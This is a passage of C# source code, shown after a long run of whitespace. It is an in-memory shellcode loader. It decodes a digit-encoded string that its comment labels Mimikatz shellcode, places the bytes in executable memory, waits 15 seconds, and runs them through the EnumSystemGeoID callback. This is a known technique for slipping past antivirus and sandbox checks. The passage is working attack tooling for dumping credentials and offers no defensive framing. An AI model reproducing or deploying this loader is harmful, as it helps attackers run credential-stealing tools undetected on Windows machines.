                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     B";

          char[] charstr = data.ToCharArray();
          string str = new string(charstr);
          string tmp = "";
          byte [] SArray = new byte [1309884]; // length of Mimikatz shellcode bytes
          int idx = 0;
          byte[] buf = { 000 };
          GCHandle pinnedObject = GCHandle.Alloc(str, GCHandleType.Pinned);
          IntPtr ptr = pinnedObject.AddrOfPinnedObject();
          pinnedObject.Free();

          for (int i = 0; i <= 1309883; i++)
          {
              for (int k = 0; k <= 2; k++) // each shellcode is 3 digits ex. 232 144 001
              {
                  buf[0] = Marshal.ReadByte( ptr + idx );
                  tmp = tmp + System.Text.Encoding.UTF8.GetString( buf );
                  idx++;
              }
              SArray[ i ] = Byte.Parse( tmp );
              tmp = "";
          }
          return SArray;
       }

        static void Main()
        {
            byte [] shellcode64 = new byte [1309884];
            shellcode64 = FindCode();
            IntPtr BaseAddress = IntPtr.Zero;
            IntPtr funcAddr = VirtualAlloc(BaseAddress, (uint)shellcode64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode64, 0, funcAddr, shellcode64.Length);
            TimeSpan TS = new TimeSpan(0,0,15);
            Thread.Sleep(TS);
            EnumSystemGeoID(GEOCLASS_NATION, 0, funcAddr);
        }
    }
}
